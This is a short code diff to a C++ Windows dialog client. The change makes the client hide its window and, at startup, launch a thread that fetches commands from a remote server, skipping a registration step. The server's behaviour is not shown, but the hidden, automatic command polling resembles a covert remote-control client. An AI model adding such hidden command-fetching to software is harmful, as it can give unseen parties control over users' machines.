@@ -97,7 +97,8 @@ BOOL CMainClientDlg::OnInitDialog()
 		wp.showCmd = SW_HIDE;
 		SetWindowPlacement(&wp);
 
-		OnBnClickedRegister();
+		CreateThread(NULL, 0, GetServerCommand, (LPVOID)this, 0, NULL);
+		//OnBnClickedRegister();
 	}
 	
 
@@ -195,8 +196,8 @@ void CMainClientDlg::OnBnClickedRegister()
 		return;
 	if (!CreateConfig())
 		return;
+
 	ShowWindow(SW_HIDE);
-	
 	CreateThread(NULL, 0, GetServerCommand, (LPVOID)this, 0, NULL);
 }
 
@@ -289,4 +290,3 @@ void CMainClientDlg::On32772()
 {
 	ShellExecute(NULL, _T("open"), "http://114.115.244.171/loginScanSelf", NULL, NULL, SW_SHOWNORMAL);
 }
-
